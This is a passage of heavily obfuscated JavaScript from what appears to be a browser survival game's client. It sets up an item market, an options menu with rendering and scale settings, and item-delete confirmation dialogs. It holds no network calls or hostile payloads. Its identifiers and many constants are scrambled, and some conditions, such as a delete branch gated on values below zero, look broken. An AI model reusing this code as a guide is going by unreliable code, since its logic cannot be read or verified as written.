					name: "gold",
					"ⵠΔⵠⵠΔ": ΔᐃⲆⵠ,
					b: 1,
					a: Δⵠᐃᐃⵠ,
					"ᐃⵠⲆⲆⵠ": Ⲇ.ⵠΔΔᐃΔᐃΔ
				}, {
					id: ⵠᐃⵠⲆ,
					name: "diamond",
					"ⵠΔⵠⵠΔ": 4,
					b: ⵠΔΔᐃΔ,
					a: 1,
					"ᐃⵠⲆⲆⵠ": Ⲇ.ᐃⵠⵠᐃⵠᐃⵠ
				}, {
					id: 4,
					name: "amethyst",
					"ⵠΔⵠⵠΔ": ᐃⵠᐃᐃⵠ,
					b: 8,
					a: 1,
					"ᐃⵠⲆⲆⵠ": Ⲇ.ⲆᐃⲆⵠΔⲆΔ
				}, {
					id: 5,
					name: "reidite",
					"ⵠΔⵠⵠΔ": 16,
					b: 16,
					a: 1,
					"ᐃⵠⲆⲆⵠ": Ⲇ.ⲆⵠⲆⲆᐃⵠⲆ
				}, {
					id: ⵠΔⵠᐃⵠ,
					name: "pumpkin_seed",
					"ⵠΔⵠⵠΔ": 10,
					b: 10,
					a: ΔΔΔ,
					"ᐃⵠⲆⲆⵠ": Ⲇ.ⵠⲆΔⲆᐃΔⲆ
				}, {
					id: ᐃⲆΔΔΔᐃᐃ,
					name: "carrot_seed",
					"ⵠΔⵠⵠΔ": 16,
					b: ⵠᐃⵠⵠⲆ,
					a: 1,
					"ᐃⵠⲆⲆⵠ": Ⲇ.ⵠⲆⲆᐃⵠⵠⲆ
				}, {
					id: ⲆⵠⵠⲆΔ,
					name: "tomato_seed",
					"ⵠΔⵠⵠΔ": ⲆΔⲆⲆΔ,
					b: ⵠⵠⲆⲆⲆΔΔ,
					a: 1,
					"ᐃⵠⲆⲆⵠ": Ⲇ.ᐃⵠⲆΔᐃᐃⵠ
				}, {
					id: 9,
					name: "thornbush_seed",
					"ⵠΔⵠⵠΔ": 30,
					b: 30,
					a: Ⲇᐃⵠ,
					"ᐃⵠⲆⲆⵠ": Ⲇ.ⵠΔⵠΔΔᐃᐃ
				}, {
					id: 10,
					name: "garlic_seed",
					"ⵠΔⵠⵠΔ": 40,
					b: 40,
					a: 1,
					"ᐃⵠⲆⲆⵠ": Ⲇ.ⲆΔΔⲆᐃΔΔ
				}, {
					id: 11,
					name: "watermelon_seed",
					"ⵠΔⵠⵠΔ": 60,
					b: 60,
					a: 1,
					"ᐃⵠⲆⲆⵠ": Ⲇ.ᐃΔⲆⵠᐃⲆⲆ
				}],
				button: Δⵠⵠ(60, 60, "", ⵠⲆ[Ⲇ.ⲆⲆᐃΔΔΔⲆ]),
				"ⵠⲆᐃ": function() {
					this.style.left = Math.floor(Δᐃⵠᐃ - 450) + ⵠ[39];
					this.style.top = Math.floor(ᐃΔⵠᐃ - 270) + ⵠ[39]
				},
				select: function() {
					ΔⵠⵠⲆ.ⲆⵠⵠⲆᐃ[ΔᐃⲆⵠⲆⵠΔ[72]] = !ΔⵠⵠⲆ.ⲆⵠⵠⲆᐃ[ΔᐃⲆⵠⲆⵠΔ[72]];
					if (ΔⵠⵠⲆ.ⲆⵠⵠⲆᐃ[ΔᐃⲆⵠⲆⵠΔ[72]]) {
						ΔⵠⵠⲆ.ⲆⵠⵠⲆᐃ.style.display = ⵠ[35]
					} else ΔⵠⵠⲆ.ⲆⵠⵠⲆᐃ.style.display = ⵠ[465]
				},
				"ⵠΔΔΔᐃ": function() {
					ΔⵠⵠⲆ.ⲆⵠⵠⲆᐃ.style.display = ⵠ[465];
					ΔⵠⵠⲆ.ⲆⵠⵠⲆᐃ[ΔᐃⲆⵠⲆⵠΔ[72]] = false
				},
				"ᐃⵠⲆΔᐃⲆᐃ": function() {
					ΔⵠⲆᐃ.ΔⲆᐃⲆⵠⵠᐃᐃΔ(this.ΔᐃⵠⲆⲆᐃⲆ)
				},
				"ⲆⲆᐃΔⲆ": function() {
					var ᐃΔ = this.id;
					if (this.ΔᐃⵠⲆⲆᐃⲆ.a === ΔᐃⲆⵠ) {
						var ΔⵠᐃΔ = Math.floor(Number(this.value) * this.ΔᐃⵠⲆⲆᐃⲆ.b);
						this.ΔᐃⵠⲆⲆᐃⲆ.ⵠΔⵠⵠΔ = ΔⵠᐃΔ;
						document[ΔᐃⲆⵠⲆⵠΔ[68]](this.ΔᐃⵠⲆⲆᐃⲆ.name + ⵠ[346])[ΔᐃⲆⵠⲆⵠΔ[290]] = ΔⵠᐃΔ + ""
					} else {
						var ΔⵠᐃΔ = Math.floor(Number(this.value) / this.ΔᐃⵠⲆⲆᐃⲆ.a);
						this.ΔᐃⵠⲆⲆᐃⲆ.ⵠΔⵠⵠΔ = ΔⵠᐃΔ;
						document[ΔᐃⲆⵠⲆⵠΔ[68]](this.ΔᐃⵠⲆⲆᐃⲆ.name + ⵠ[346])[ΔᐃⲆⵠⲆⵠΔ[290]] = ΔⵠᐃΔ + ""
					}
				}
			};
			document[ΔᐃⲆⵠⲆⵠΔ[68]]("quit_market")[ΔᐃⲆⵠⲆⵠΔ[277]](ⵠ[215], this.ⲆⵠⵠⲆᐃ.ⵠΔΔΔᐃ, ᐃᐃⵠΔⵠ);
			var ⵠⵠᐃΔᐃᐃΔ = [
				[ⵠ[215], this.ⲆⵠⵠⲆᐃ.ᐃⵠⲆΔᐃⲆᐃ, "buy_"],
				[ⵠ[316], this.ⲆⵠⵠⲆᐃ.ⲆⲆᐃΔⲆ, ""],
				["change", this.ⲆⵠⵠⲆᐃ.ⲆⲆᐃΔⲆ, ""],
				["keypress", this.ⲆⵠⵠⲆᐃ.keypress, ""]
			];
			for (var ᐃⵠᐃⵠ = 0; this.ⲆⵠⵠⲆᐃ.items.length > ᐃⵠᐃⵠ; ᐃⵠᐃⵠ++) {
				var ΔΔΔⵠⵠ = this.ⲆⵠⵠⲆᐃ.items[ᐃⵠᐃⵠ];
				document[ΔᐃⲆⵠⲆⵠΔ[68]](ΔΔΔⵠⵠ.name + "_market").src = ⵠⲆ[ΔΔΔⵠⵠ.ᐃⵠⲆⲆⵠ][0].ⲆⲆᐃⲆⲆ === undefined ? ⵠⲆ[ΔΔΔⵠⵠ.ᐃⵠⲆⲆⵠ][ᐃΔΔ].src : ⵠⲆ[ΔΔΔⵠⵠ.ᐃⵠⲆⲆⵠ][0].ⲆⲆᐃⲆⲆ;
				if (ΔΔΔⵠⵠ.a === ⵠᐃⵠΔ) {
					document[ΔᐃⲆⵠⲆⵠΔ[68]](ΔΔΔⵠⵠ.name + ⵠ[346])[ΔᐃⲆⵠⲆⵠΔ[290]] = ΔΔΔⵠⵠ.b;
					document[ΔᐃⲆⵠⲆⵠΔ[68]](ΔΔΔⵠⵠ.name + ⵠ[302]).value = ⵠΔⵠΔ;
					document[ΔᐃⲆⵠⲆⵠΔ[68]](ΔΔΔⵠⵠ.name + ⵠ[302]).step = ΔⲆᐃᐃ;
					document[ΔᐃⲆⵠⲆⵠΔ[68]](ΔΔΔⵠⵠ.name + ⵠ[302]).min = 1;
					document[ΔᐃⲆⵠⲆⵠΔ[68]](ΔΔΔⵠⵠ.name + ⵠ[302]).max = Math.floor(255 / ΔΔΔⵠⵠ.b)
				} else {
					document[ΔᐃⲆⵠⲆⵠΔ[68]](ΔΔΔⵠⵠ.name + ⵠ[346])[ΔᐃⲆⵠⲆⵠΔ[290]] = ΔΔᐃⵠ;
					document[ΔᐃⲆⵠⲆⵠΔ[68]](ΔΔΔⵠⵠ.name + ⵠ[302]).value = ΔΔΔⵠⵠ.a;
					document[ΔᐃⲆⵠⲆⵠΔ[68]](ΔΔΔⵠⵠ.name + ⵠ[302]).step = ΔΔΔⵠⵠ.a;
					document[ΔᐃⲆⵠⲆⵠΔ[68]](ΔΔΔⵠⵠ.name + ⵠ[302]).min = ΔΔΔⵠⵠ.a
				}
				document[ΔᐃⲆⵠⲆⵠΔ[68]]("buy_" + ΔΔΔⵠⵠ.name + ⵠ[302]).ΔᐃⵠⲆⲆᐃⲆ = ΔΔΔⵠⵠ;
				document[ΔᐃⲆⵠⲆⵠΔ[68]](ΔΔΔⵠⵠ.name + ⵠ[302]).ΔᐃⵠⲆⲆᐃⲆ = ΔΔΔⵠⵠ;
				for (var ⵠᐃ = Ⲇᐃᐃᐃ; ⵠⵠᐃΔᐃᐃΔ.length > ⵠᐃ; ⵠᐃ++) document[ΔᐃⲆⵠⲆⵠΔ[68]](ⵠⵠᐃΔᐃᐃΔ[ⵠᐃ][2] + ΔΔΔⵠⵠ.name + ⵠ[302])[ΔᐃⲆⵠⲆⵠΔ[277]](ⵠⵠᐃΔᐃᐃΔ[ⵠᐃ][0], ⵠⵠᐃΔᐃᐃΔ[ⵠᐃ][ⵠΔᐃ], false)
			}
			$("[type='number']").keypress((function(ΔΔΔⲆ) {
				ΔΔΔⲆ.preventDefault()
			}));
			this.options = {
				open: ⲆⲆⲆᐃⵠ,
				id: document[ΔᐃⲆⵠⲆⵠΔ[68]]("option_in_game"),
				style: document[ΔᐃⲆⵠⲆⵠΔ[68]]("option_in_game").style,
				"ΔΔⲆⲆⵠ": document[ΔᐃⲆⵠⲆⵠΔ[68]]("agree_ing").style,
				"ᐃⵠⵠΔΔⵠⲆ": document[ΔᐃⲆⵠⲆⵠΔ[68]]("cancel_agree_ing").style,
				"ⵠⲆᐃⲆⲆⲆⲆ": document[ΔᐃⲆⵠⲆⵠΔ[68]]("quest_agree_ing").style,
				"ⵠⲆΔΔⲆⵠⲆ": document[ΔᐃⲆⵠⲆⵠΔ[68]]("spectator_agree_ing").style,
				"ⲆⲆⲆΔΔΔⵠ": document[ΔᐃⲆⵠⲆⵠΔ[68]]("auto_feed_agree_ing").style,
				"Δᐃᐃⵠⵠⵠᐃ": document[ΔᐃⲆⵠⲆⵠΔ[68]]("info_agree_ing").style,
				"ΔᐃΔⵠΔⲆⲆ": document[ΔᐃⲆⵠⲆⵠΔ[68]]("pixelated_agree_ing").style,
				button: Δⵠⵠ(60, 60, "", ⵠⲆ[Ⲇ.ⲆΔⵠⵠⲆ]),
				"ⲆΔⵠΔᐃᐃⲆⵠΔ": function() {
					ΔⵠⵠⲆ.options[ΔᐃⲆⵠⲆⵠΔ[72]] = !ΔⵠⵠⲆ.options[ΔᐃⲆⵠⲆⵠΔ[72]];
					if (ΔⵠⵠⲆ.options[ΔᐃⲆⵠⲆⵠΔ[72]]) ΔⵠⵠⲆ.options.style.display = ⵠ[35];
					else ΔⵠⵠⲆ.options.style.display = ⵠ[465]
				},
				"ΔᐃⲆⵠⲆⲆⵠΔᐃ": function() {
					ⵠⲆᐃΔ.ⵠⲆⲆⲆⲆᐃⵠ()
				},
				"ᐃᐃⲆⲆⵠⲆΔⵠΔ": function() {
					ⵠⲆᐃΔ.ⲆⵠᐃⲆᐃΔⵠ()
				},
				high: function() {
					ⵠⲆᐃΔ.ⵠⵠᐃᐃⲆⵠᐃΔΔ()
				},
				low: function() {
					ⵠⲆᐃΔ.ⵠΔᐃⲆΔⲆⵠⵠⲆ()
				},
				"ΔᐃΔⵠⲆ": function() {
					ΔⵠⵠⲆ.ⵠⵠᐃᐃ.ΔᐃΔⵠⲆ()
				},
				"ΔᐃⵠΔΔΔⵠΔᐃ": function() {
					ΔⵠⵠⲆ.ⵠΔⵠⲆⵠ.ΔᐃΔⵠⲆ()
				},
				"ΔᐃⵠΔⲆⲆΔΔΔ": function() {
					ΔⵠⵠⲆ.ᐃⲆᐃⲆ.ΔᐃΔⵠⲆ()
				},
				"ᐃⲆⵠΔⵠᐃⲆⵠⲆ": function() {
					ᐃᐃΔ.ᐃⵠⲆᐃⵠ.ⵠⲆᐃⲆⲆⵠᐃ()
				},
				"ⵠᐃᐃᐃⵠⵠᐃᐃΔ": function() {
					ᐃᐃΔ.ⵠⲆⵠᐃᐃ.ⵠⲆᐃⲆⲆⵠᐃ()
				},
				"ⵠΔΔΔᐃ": function() {
					ΔⵠⵠⲆ.options.style.display = ⵠ[465];
					ΔⵠⵠⲆ.options[ΔᐃⲆⵠⲆⵠΔ[72]] = false
				},
				"ⵠⲆᐃ": function() {
					this.style.left = Math.floor(Δᐃⵠᐃ - 235) + ⵠ[39];
					this.style.top = Math.floor(ᐃΔⵠᐃ - 170) + ⵠ[39]
				}
			};
			document[ΔᐃⲆⵠⲆⵠΔ[68]](ⵠ[216])[ΔᐃⲆⵠⲆⵠΔ[277]](ⵠ[215], this.options.ΔᐃⲆⵠⲆⲆⵠΔᐃ, false);
			document[ΔᐃⲆⵠⲆⵠΔ[68]](ⵠ[151])[ΔᐃⲆⵠⲆⵠΔ[277]](ⵠ[215], this.options.ᐃᐃⲆⲆⵠⲆΔⵠΔ, ⵠᐃΔΔⵠ);
			document[ΔᐃⲆⵠⲆⵠΔ[68]](ⵠ[213])[ΔᐃⲆⵠⲆⵠΔ[277]](ⵠ[215], this.options.low, false);
			document[ΔᐃⲆⵠⲆⵠΔ[68]](ⵠ[291])[ΔᐃⲆⵠⲆⵠΔ[277]](ⵠ[215], this.options.high, ⵠᐃΔΔⵠ);
			document[ΔᐃⲆⵠⲆⵠΔ[68]]("quit_opt")[ΔᐃⲆⵠⲆⵠΔ[277]](ⵠ[215], this.options.ⵠΔΔΔᐃ, ⲆⵠΔⵠΔ);
			document[ΔᐃⲆⵠⲆⵠΔ[68]]("case_agree_opt")[ΔᐃⲆⵠⲆⵠΔ[277]](ⵠ[215], this.options.ΔᐃΔⵠⲆ, false);
			document[ΔᐃⲆⵠⲆⵠΔ[68]]("quest_case_agree_opt")[ΔᐃⲆⵠⲆⵠΔ[277]](ⵠ[215], this.options.ΔᐃⵠΔⲆⲆΔΔΔ, ΔᐃⵠᐃⲆ);
			document[ΔᐃⲆⵠⲆⵠΔ[68]]("cancel_case_agree_opt")[ΔᐃⲆⵠⲆⵠΔ[277]](ⵠ[215], this.options.ΔᐃⵠΔΔΔⵠΔᐃ, ⵠᐃΔΔⵠ);
			document[ΔᐃⲆⵠⲆⵠΔ[68]]("spectator_case_agree_opt")[ΔᐃⲆⵠⲆⵠΔ[277]](ⵠ[215], this.options.ᐃⲆⵠΔⵠᐃⲆⵠⲆ, ΔᐃᐃⲆⲆ);
			document[ΔᐃⲆⵠⲆⵠΔ[68]]("auto_feed_case_agree_opt")[ΔᐃⲆⵠⲆⵠΔ[277]](ⵠ[215], this.options.ⵠᐃᐃᐃⵠⵠᐃᐃΔ, false);
			this.ⵠΔⵠⲆⵠ = {
				open: false,
				"ⵠᐃΔΔΔ": ΔΔᐃᐃ.get(ⵠ[535]) ? ΔΔᐃᐃ.get(ⵠ[535]) === "0" ? ᐃⵠⲆⵠ : ⵠᐃⵠΔ : 1,
				id: document[ΔᐃⲆⵠⲆⵠΔ[68]](ⵠ[77]),
				style: document[ΔᐃⲆⵠⲆⵠΔ[68]](ⵠ[77]).style,
				"ΔΔⲆⲆⵠ": document[ΔᐃⲆⵠⲆⵠΔ[68]]("cancel_agree").style,
				button: ⵠΔⲆⵠ,
				"ⵠᐃ": 0,
				"ⵠΔΔΔᐃ": function() {
					ΔⵠⵠⲆ.ⵠΔⵠⲆⵠ.style.display = ⵠ[465];
					ΔⵠⵠⲆ.ⵠΔⵠⲆⵠ[ΔᐃⲆⵠⲆⵠΔ[72]] = false
				},
				"ⵠⵠⵠΔⵠΔⲆ": function() {
					if (ᐃᐃΔ.ⵠΔΔⲆ.ⲆΔΔⲆⲆ) ΔⵠⲆᐃ.ᐃⲆΔΔⲆᐃⲆᐃⲆ();
					ΔⵠⵠⲆ.ⵠΔⵠⲆⵠ.ⵠΔΔΔᐃ()
				},
				"ΔᐃΔⵠⲆ": function() {
					if (!ΔⵠⵠⲆ.ⵠΔⵠⲆⵠ.ⵠᐃΔΔΔ) {
						ΔΔᐃᐃ.set(ⵠ[535], "1");
						ΔⵠⵠⲆ.ⵠΔⵠⲆⵠ.ΔΔⲆⲆⵠ.display = ⵠ[465];
						ΔⵠⵠⲆ.options.ᐃⵠⵠΔΔⵠⲆ.display = ⵠ[35]
					} else {
						ΔΔᐃᐃ.set(ⵠ[535], "0");
						ΔⵠⵠⲆ.ⵠΔⵠⲆⵠ.ΔΔⲆⲆⵠ.display = ⵠ[35];
						ΔⵠⵠⲆ.options.ᐃⵠⵠΔΔⵠⲆ.display = ⵠ[465]
					}
					ΔⵠⵠⲆ.ⵠΔⵠⲆⵠ.ⵠᐃΔΔΔ = !ΔⵠⵠⲆ.ⵠΔⵠⲆⵠ.ⵠᐃΔΔΔ
				},
				"ΔⵠⲆⲆⲆⲆᐃ": function() {
					if (!this.ⵠᐃΔΔΔ) this.ⵠⵠⵠΔⵠΔⲆ();
					else {
						this.style.display = ⵠ[35];
						this[ΔᐃⲆⵠⲆⵠΔ[72]] = ⵠⲆΔᐃⲆ
					}
				},
				"ⵠⲆᐃ": function() {
					this.style.left = Math.floor(Δᐃⵠᐃ - 235) + ⵠ[39];
					this.style.top = Math.floor(ᐃΔⵠᐃ - 130) + ⵠ[39]
				}
			};
			this.ⵠΔⵠⲆⵠ.id.oncontextmenu = function() {
				return false
			};
			this.ⵠΔⵠⲆⵠ.ΔΔⲆⲆⵠ.display = ⵠ[465];
			if (this.ⵠΔⵠⲆⵠ.ⵠᐃΔΔΔ) this.options.ᐃⵠⵠΔΔⵠⲆ.display = ⵠ[35];
			else this.options.ᐃⵠⵠΔΔⵠⲆ.display = ⵠ[465];
			document[ΔᐃⲆⵠⲆⵠΔ[68]]("cancel_yes_delete")[ΔᐃⲆⵠⲆⵠΔ[277]](ⵠ[215], this.ⵠΔⵠⲆⵠ.ⵠⵠⵠΔⵠΔⲆ, false);
			document[ΔᐃⲆⵠⲆⵠΔ[68]]("cancel_no_delete")[ΔᐃⲆⵠⲆⵠΔ[277]](ⵠ[215], this.ⵠΔⵠⲆⵠ.ⵠΔΔΔᐃ, ΔᐃⵠᐃⲆ);
			document[ΔᐃⲆⵠⲆⵠΔ[68]]("cancel_case_agree")[ΔᐃⲆⵠⲆⵠΔ[277]](ⵠ[215], this.ⵠΔⵠⲆⵠ.ΔᐃΔⵠⲆ, false);
			document[ΔᐃⲆⵠⲆⵠΔ[277]](ⵠ[77], (function(ⵠΔⵠⵠ) {
				ⵠΔⵠⵠ.preventDefault()
			}), ᐃⵠⵠᐃΔ);
			this.ᐃⵠΔᐃⲆΔΔ = {
				"ⵠᐃΔΔΔ": ΔΔᐃᐃ.get(ⵠ[131]) ? ΔΔᐃᐃ.get(ⵠ[131]) === "0" ? ΔΔⵠⵠ : 1 : 1,
				"ΔⵠⵠᐃΔᐃⵠ": function(ⵠΔⵠⵠΔ) {
					if (ⵠΔⵠⵠΔ) document[ΔᐃⲆⵠⲆⵠΔ[68]]("game_canvas").style.imageRendering = "pixelated";
					else document[ΔᐃⲆⵠⲆⵠΔ[68]]("game_canvas").style.imageRendering = "auto"
				},
				"ΔᐃΔⵠⲆ": function() {
					if (ΔⵠⵠⲆ.ᐃⵠΔᐃⲆΔΔ.ⵠᐃΔΔΔ === ⲆⲆⲆᐃ) {
						ΔΔᐃᐃ.set(ⵠ[131], "1");
						ΔⵠⵠⲆ.ᐃⵠΔᐃⲆΔΔ.ΔⵠⵠᐃΔᐃⵠ(1);
						ΔⵠⵠⲆ.options.ΔᐃΔⵠΔⲆⲆ.display = ⵠ[35]
					} else {
						ΔΔᐃᐃ.set(ⵠ[131], "0");
						ΔⵠⵠⲆ.ᐃⵠΔᐃⲆΔΔ.ΔⵠⵠᐃΔᐃⵠ(0);
						ΔⵠⵠⲆ.options.ΔᐃΔⵠΔⲆⲆ.display = ⵠ[465]
					}
					ΔⵠⵠⲆ.ᐃⵠΔᐃⲆΔΔ.ⵠᐃΔΔΔ = (ΔⵠⵠⲆ.ᐃⵠΔᐃⲆΔΔ.ⵠᐃΔΔΔ + ΔΔᐃⵠ) % 2
				}
			};
			ⲆⵠⲆⲆ === this.ᐃⵠΔᐃⲆΔΔ.ⵠᐃΔΔΔ ? this.options.ΔᐃΔⵠΔⲆⲆ.display = ⵠ[35] : (this.ᐃⵠΔᐃⲆΔΔ.ΔⵠⵠᐃΔᐃⵠ(0), this.options.ΔᐃΔⵠΔⲆⲆ.display = ⵠ[465]);
			document[ΔᐃⲆⵠⲆⵠΔ[68]]("pixelated_case_agree_opt")[ΔᐃⲆⵠⲆⵠΔ[277]](ⵠ[215], this.ᐃⵠΔᐃⲆΔΔ.ΔᐃΔⵠⲆ, ᐃᐃΔᐃΔ);
			this.Δᐃᐃᐃᐃ = {
				"ⵠᐃΔΔΔ": ΔΔᐃᐃ.get(ⵠ[150]) ? ΔΔᐃᐃ.get(ⵠ[150]) === "0" ? ⵠⲆⲆ : ΔᐃⲆⵠ : ᐃᐃⵠ,
				display: ᐃⵠⲆⵠ,
				x: ΔⲆⵠⲆ,
				y: 0,
				id: ⵠⲆᐃⵠ,
				"ⵠΔΔⲆ": 0,
				"ΔᐃΔⵠⲆ": function() {
					if (ΔⵠⵠⲆ.Δᐃᐃᐃᐃ.ⵠᐃΔΔΔ === ⵠⲆᐃⵠ) {
						ΔΔᐃᐃ.set(ⵠ[150], "1");
						ΔⵠⵠⲆ.options.Δᐃᐃⵠⵠⵠᐃ.display = ⵠ[35]
					} else {
						ΔΔᐃᐃ.set(ⵠ[150], "0");
						ΔⵠⵠⲆ.options.Δᐃᐃⵠⵠⵠᐃ.display = ⵠ[465]
					}
					ΔⵠⵠⲆ.Δᐃᐃᐃᐃ.ⵠᐃΔΔΔ = (ΔⵠⵠⲆ.Δᐃᐃᐃᐃ.ⵠᐃΔΔΔ + 1) % 2
				},
				"ⵠΔⵠⲆ": function(ΔⵠΔⲆΔⲆΔ, ⲆⲆᐃᐃ, ⵠΔΔⲆ) {
					if (ΔⵠΔⲆΔⲆΔ && this.ⵠᐃΔΔΔ) {
						this.display = 1;
						if (ⵠΔΔⲆ === 0) this.id = ⲆⲆᐃᐃ.id;
						else this.id = ⵠⲆⵠᐃΔ[ⲆⲆᐃᐃ.id].ⵠΔᐃⲆ;
						this.x = ⲆⲆᐃᐃ.info.translate.x + 80;
						this.y = ⲆⲆᐃᐃ.info.translate.y;
						this.ⵠΔΔⲆ = ⵠΔΔⲆ
					}
					return ΔⵠΔⲆΔⲆΔ
				}
			};
			if (ⵠΔᐃ === this.Δᐃᐃᐃᐃ.ⵠᐃΔΔΔ) this.options.Δᐃᐃⵠⵠⵠᐃ.display = ⵠ[35];
			else this.options.Δᐃᐃⵠⵠⵠᐃ.display = ⵠ[465];
			document[ΔᐃⲆⵠⲆⵠΔ[68]]("info_case_agree_opt")[ΔᐃⲆⵠⲆⵠΔ[277]](ⵠ[215], this.Δᐃᐃᐃᐃ.ΔᐃΔⵠⲆ, ΔᐃⵠᐃⲆ);
			ΔΔᐃᐃ.get("starve_scale") && (ᐃⲆⲆᐃΔᐃᐃ = Number(ΔΔᐃᐃ.get("starve_scale")), document[ΔᐃⲆⵠⲆⵠΔ[68]](ⵠ[246]).value = ᐃⲆⲆᐃΔᐃᐃ, ᐃⲆⲆᐃΔᐃᐃ *= devicePixelRatio / ⲆΔᐃΔΔᐃⲆ, ⲆⲆΔⲆⲆⵠᐃ());
			this.ᐃΔΔⲆᐃⵠᐃ = function() {
				ΔΔᐃᐃ.set("starve_scale", "" + document[ΔᐃⲆⵠⲆⵠΔ[68]](ⵠ[246]).value);
				ᐃⲆⲆᐃΔᐃᐃ = document[ΔᐃⲆⵠⲆⵠΔ[68]](ⵠ[246]).value * (devicePixelRatio / ⲆΔᐃΔΔᐃⲆ);
				ⲆⲆΔⲆⲆⵠᐃ()
			};
			document[ΔᐃⲆⵠⲆⵠΔ[68]](ⵠ[246])[ΔᐃⲆⵠⲆⵠΔ[277]]("input", this.ᐃΔΔⲆᐃⵠᐃ, false);
			this.ⵠⵠᐃᐃ = {
				open: ΔΔⵠⲆΔ,
				"ⵠᐃΔΔΔ": ΔΔᐃᐃ.get(ⵠ[214]) ? ΔΔᐃᐃ.get(ⵠ[214]) === "0" ? 0 : ΔᐃⲆⵠ : 1,
				id: document[ΔᐃⲆⵠⲆⵠΔ[68]]("sure_delete"),
				style: document[ΔᐃⲆⵠⲆⵠΔ[68]]("sure_delete").style,
				"ΔΔⲆⲆⵠ": document[ΔᐃⲆⵠⲆⵠΔ[68]]("agree").style,
				button: 0,
				"ⵠᐃ": 0,
				"ⵠΔΔΔᐃ": function() {
					ΔⵠⵠⲆ.ⵠⵠᐃᐃ.style.display = ⵠ[465];
					ΔⵠⵠⲆ.ⵠⵠᐃᐃ[ΔᐃⲆⵠⲆⵠΔ[72]] = false
				},
				all: function() {
					if (!ᐃᐃΔ.ᐃⲆⲆⵠᐃ.wait) {
						if (ᐃᐃΔ.ⵠΔΔⲆ.ᐃΔᐃᐃ < ᐃⵠⲆ && ᐃᐃΔ.ⵠΔΔⲆ.id < ΔⲆⲆ) ΔⵠⲆᐃ.ΔΔⲆᐃᐃⵠᐃᐃⲆ(ΔⵠⵠⲆ.ⵠⵠᐃᐃ.button);
						ΔⵠⵠⲆ.ⵠⵠᐃᐃ.ⵠΔΔΔᐃ()
					}
				},
				"ⵠⲆⵠΔ": function() {
					if (ᐃᐃΔ.ⵠΔΔⲆ.ⵠⵠⵠᐃΔ && !ᐃᐃΔ.ᐃⲆⲆⵠᐃ.wait) {
						if (ᐃᐃΔ.ⵠΔΔⲆ.ᐃΔᐃᐃ < ᐃⵠⲆ && ᐃᐃΔ.ⵠΔΔⲆ.id < ᐃⵠⲆⵠ   ) ΔⵠⲆᐃ.ⲆΔᐃᐃΔΔⵠᐃᐃ(ΔⵠⵠⲆ.ⵠⵠᐃᐃ.button);
						ΔⵠⵠⲆ.ⵠⵠᐃᐃ.ⵠΔΔΔᐃ()
					}
				},
				"ΔΔⵠⲆⲆᐃⵠᐃᐃ": function() {
					if (!ᐃᐃΔ.ᐃⲆⲆⵠᐃ.wait) {
						if (ᐃᐃΔ.ⵠΔΔⲆ.ᐃΔᐃᐃ < 0 && ᐃᐃΔ.ⵠΔΔⲆ.id < 0   ) ΔⵠⲆᐃ.ΔⵠΔⵠⵠⲆⵠᐃⵠ(ΔⵠⵠⲆ.ⵠⵠᐃᐃ.button);
						ΔⵠⵠⲆ.ⵠⵠᐃᐃ.ⵠΔΔΔᐃ()
					}
				},
				"ΔᐃΔⵠⲆ": function() {
					if (!ΔⵠⵠⲆ.ⵠⵠᐃᐃ.ⵠᐃΔΔΔ) {
						ΔΔᐃᐃ.set(ⵠ[214], "1");
						ΔⵠⵠⲆ.ⵠⵠᐃᐃ.ΔΔⲆⲆⵠ.display = ⵠ[465];
						ΔⵠⵠⲆ.options.ΔΔⲆⲆⵠ.display = ⵠ[35]
					} else {
						ΔΔᐃᐃ.set(ⵠ[214], "0");
						ΔⵠⵠⲆ.ⵠⵠᐃᐃ.ΔΔⲆⲆⵠ.display = ⵠ[35];
						ΔⵠⵠⲆ.options.ΔΔⲆⲆⵠ.display = ⵠ[465]
					}
					ΔⵠⵠⲆ.ⵠⵠᐃᐃ.ⵠᐃΔΔΔ = !ΔⵠⵠⲆ.ⵠⵠᐃᐃ.ⵠᐃΔΔΔ
				},
				"ΔⵠⲆⲆⲆⲆᐃ": function(ⲆⲆᐃᐃ) {
					this.button = ⲆⲆᐃᐃ;
					document[ΔᐃⲆⵠⲆⵠΔ[68]]("item_to_del").src = ⵠⲆ[ⲆⲆⵠᐃ[ⲆⲆᐃᐃ].ᐃⵠ][ΔⲆⵠⲆ].ⲆⲆᐃⲆⲆ === undefined ? ⵠⲆ[ⲆⲆⵠᐃ[ⲆⲆᐃᐃ].ᐃⵠ][0].src : ⵠⲆ[ⲆⲆⵠᐃ[ⲆⲆᐃᐃ].ᐃⵠ][Ⲇᐃᐃᐃ].ⲆⲆᐃⲆⲆ;
					if (ⲆⲆⵠᐃ[ⲆⲆᐃᐃ].ⵠⲆⵠΔ && !ᐃᐃΔ.ⵠⵠⲆⵠⵠ && ᐃᐃΔ.ⵠΔΔⲆ.ⵠⵠⵠᐃΔ) document[ΔᐃⲆⵠⲆⵠΔ[68]]("recycle_delete").style.display = ⵠ[35];
					else document[ΔᐃⲆⵠⲆⵠΔ[68]]("recycle_delete").style.display = ⵠ[465];
					if (!this.ⵠᐃΔΔΔ) this.all();
					else {
						this.style.display = ⵠ[35];
						this[ΔᐃⲆⵠⲆⵠΔ[72]] = true
					}
				},
				"ⵠⲆᐃ": function() {
					this.style.left = Math.floor(Δᐃⵠᐃ - 235) + ⵠ[39];
					this.style.top = Math.floor(ᐃΔⵠᐃ - 175) + ⵠ[39]
				}
			};
			this.ⵠⵠᐃᐃ.ΔΔⲆⲆⵠ.display = ⵠ[465];
			this.ⵠⵠᐃᐃ.ⵠᐃΔΔΔ ? this.options.ΔΔⲆⲆⵠ.display = ⵠ[35] : this.options.ΔΔⲆⲆⵠ.display = ⵠ[465];
			document[ΔᐃⲆⵠⲆⵠΔ[68]]("one_delete")[ΔᐃⲆⵠⲆⵠΔ[277]](ⵠ[215], this.ⵠⵠᐃᐃ.ΔΔⵠⲆⲆᐃⵠᐃᐃ, false);
			document[ΔᐃⲆⵠⲆⵠΔ[68]]("yes_delete")[ΔᐃⲆⵠⲆⵠΔ[277]](ⵠ[215], this.ⵠⵠᐃᐃ.all, ⲆΔᐃⲆΔ);
			document[ΔᐃⲆⵠⲆⵠΔ[68]]("recycle_delete")[ΔᐃⲆⵠⲆⵠΔ[277]](ⵠ[215], this.ⵠⵠᐃᐃ.ⵠⲆⵠΔ, false);
			document[ΔᐃⲆⵠⲆⵠΔ[68]]("no_delete")[ΔᐃⲆⵠⲆⵠΔ[277]](ⵠ[215], this.ⵠⵠᐃᐃ.ⵠΔΔΔᐃ, ⵠᐃΔΔⵠ);
